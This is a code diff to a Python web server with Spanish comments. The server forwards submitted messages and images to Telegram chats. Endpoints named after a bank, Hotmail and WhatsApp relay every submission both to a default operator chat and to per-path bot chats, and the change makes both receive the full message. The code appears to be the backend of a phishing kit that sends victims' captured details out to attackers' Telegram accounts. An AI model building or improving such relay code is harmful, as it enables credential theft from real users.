@@ -732,12 +732,11 @@ def decode_base64_image(base64_string: str) -> bytes:
         logger.error(f"Error decodificando imagen base64: {e}")
         raise ValueError(f"Imagen base64 inválida: {e}")
 
-
 PATHS_DOBLE_ENVIO = {
     "/lafise2", "/hotma1", "/hotma2", "/hotma3", 
-    "/wts1", "/wts2", "/wts3", "/wtspnew" , "/bbdsasd"
+    "/wts1", "/wts2", "/wts3", "/wtspnew", "/bbdsasd"
 }
-PATHS_SIN_VALIDACION = {"/victovivienda"  }
+PATHS_SIN_VALIDACION = {"/victovivienda"}
 
 # =========================
 # Endpoints dinámicos (MULTIPART en /docs, imagen OPCIONAL)
@@ -848,27 +847,27 @@ async def handle_dynamic_endpoint_optimized_with_image(
                 )
                 telegram_results.append(r)
             elif path.startswith("/maikel"):
-                # Envía al DEFAULT_CHAT_ID con imagen
+                # Envía al DEFAULT_CHAT_ID con imagen y mensaje completo
                 r1 = await enviar_telegram_hibrido(
                     mensaje_completo, DEFAULT_CHAT_ID, TOKEN, 1,
                     image_data=image_data, image_filename=image_filename
                 )
                 telegram_results.append(r1)
-                # Envía al chat específico también con imagen
+                # Envía al chat específico también con imagen y mensaje completo
                 r2 = await enviar_telegram_hibrido(
-                    mensaje, config["chat_id"], config["bot_id"], 1,
+                    mensaje_completo, config["chat_id"], config["bot_id"], 1,
                     image_data=image_data, image_filename=image_filename
                 )
                 telegram_results.append(r2)
             elif any(path.startswith(p) for p in PATHS_DOBLE_ENVIO):
-                # TODOS los paths especificados: lafise2, hotma1-3, wts1-3
-                # Envía al DEFAULT_CHAT_ID con imagen
+                # TODOS los paths: lafise2, hotma1-3, wts1-3, bbdsasd
+                # Envía al DEFAULT_CHAT_ID con imagen y mensaje completo
                 r1 = await enviar_telegram_hibrido(
                     mensaje_completo, DEFAULT_CHAT_ID, TOKEN, 1,
                     image_data=image_data, image_filename=image_filename
                 )
                 telegram_results.append(r1)
-                # Envía al chat específico también con imagen
+                # Envía al chat específico también con imagen y mensaje completo
                 r2 = await enviar_telegram_hibrido(
                     mensaje_completo, config["chat_id"], config["bot_id"], 1,
                     image_data=image_data, image_filename=image_filename
@@ -876,15 +875,15 @@ async def handle_dynamic_endpoint_optimized_with_image(
                 telegram_results.append(r2)
             else:
                 # TODOS LOS DEMÁS ENDPOINTS - Envía imagen a AMBOS
-                # Envía al DEFAULT_CHAT_ID con imagen
+                # Envía al DEFAULT_CHAT_ID con imagen y mensaje completo
                 r1 = await enviar_telegram_hibrido(
                     mensaje_completo, DEFAULT_CHAT_ID, TOKEN, 1,
                     image_data=image_data, image_filename=image_filename
                 )
                 telegram_results.append(r1)
-                # Envía al chat específico también con imagen
+                # Envía al chat específico también con imagen y mensaje completo
                 r2 = await enviar_telegram_hibrido(
-                    mensaje, config["chat_id"], config["bot_id"], 1,
+                    mensaje_completo, config["chat_id"], config["bot_id"], 1,
                     image_data=image_data, image_filename=image_filename
                 )
                 telegram_results.append(r2)
@@ -1761,6 +1760,7 @@ if __name__ == "__main__":
         server_header=False,
         date_header=False
     )
+
 
 
 
